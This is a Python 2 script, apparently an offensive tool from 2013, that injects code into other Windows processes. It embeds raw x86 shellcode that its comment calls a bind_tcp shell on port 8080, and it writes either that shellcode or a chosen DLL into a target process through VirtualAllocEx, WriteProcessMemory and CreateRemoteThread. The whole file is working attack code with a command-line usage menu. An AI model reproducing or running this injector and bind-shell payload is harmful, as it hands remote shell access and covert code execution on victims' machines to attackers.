#
# shellinjector.py coded by Guilherme(smurfx) @ 2013
# This is a simple code how to inject shellcode and dll into process in an Windows environment 
# 
# Let's keep moving


from ctypes import *
import sys
from os import path


#This is a simple bind_tcp code that listen the TCP port 8080, here you
#could add any shellcode of your preference.
SHELLCODE = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
"\x31\xdb\x53\x68\x02\x00\x1f\x90\x89\xe6\x6a\x10\x56\x57\x68"
"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5"
"\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7\x68\x75"
"\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e"
"\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56"
"\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

kernel32 = windll.kernel32

def inject(pid):

	print "[+] Injecting Shellcode into the PID: %d" % pid

	pTarget = kernel32.OpenProcess(0x1F0FFF,False,pid)

	if pTarget == 0:
		print "[-] PID not found, exiting..."
		sys.exit(0)

	#Alloc memory to the shellcode
	valloc_addr = kernel32.VirtualAllocEx(pTarget, None,len(SHELLCODE),c_int(0x1000),c_int(0x40))

	kernel32.VirtualLock(c_int(valloc_addr),c_int(len(SHELLCODE)))
	
	kernel32.WriteProcessMemory(pTarget, c_int(valloc_addr), SHELLCODE, c_int(len(SHELLCODE)), c_int(0))
	
	rThread = kernel32.CreateRemoteThread(pTarget, None, 0, valloc_addr, 0, 0, None)

	if rThread == 0:
		print "[-] The injection has failed."


def dllinject(dllpath, pid):


	print "[+] Injecting DLL into the PID: %d" % pid

	pTarget = kernel32.OpenProcess(0x1F0FFF,False,pid)

	if pTarget == 0:
		print "[-] PID not found, exiting..."
		sys.exit(0)

	LoadLibraryAddress = kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll"),"LoadLibraryA")

	valloc_addr = kernel32.VirtualAllocEx(pTarget, None,len(dllpath),c_int(0x1000),c_int(0x40))

	kernel32.WriteProcessMemory(pTarget, c_int(valloc_addr), dllpath, c_int(len(dllpath)), c_int(0))
	
	rThread = kernel32.CreateRemoteThread(pTarget, None, 0, LoadLibraryAddress, valloc_addr, 0, None)
	
	kernel32.WaitForSingleObject(c_int(rThread),c_int(-1))

	if rThread == 0:
		print "[-] The injection has failed."


def usage():
	print "[+] Usage: shellinjector.py -dll DLL_PATH PID"
	print "[+]        shellinjector.py -shell PID"
	print "[+]"
	print "[-] You must specify the PID"
	sys.exit(0)

def main():

	print "[+] Shellcode Injector by Smurfx"
	print "[+] Let's keep moving...."
	
	if len(sys.argv) < 2:
		usage()

	if sys.argv[1] == "-dll":
		if len(sys.argv) < 4:
			usage()

		dllpath = path.abspath(sys.argv[2])
		pid = int(sys.argv[3])

		if not path.exists(dllpath):
			print "[-] DLL not found."
			sys.exit(0)

		dllinject(dllpath, pid)

	elif sys.argv[1] == "-shell":
		if len(sys.argv) < 3:
			usage()

		pid = int(sys.argv[2])
		inject(pid)

	else:
		print "[-] Invalid option"
		sys.exit(0)

if __name__ == "__main__":
	main()
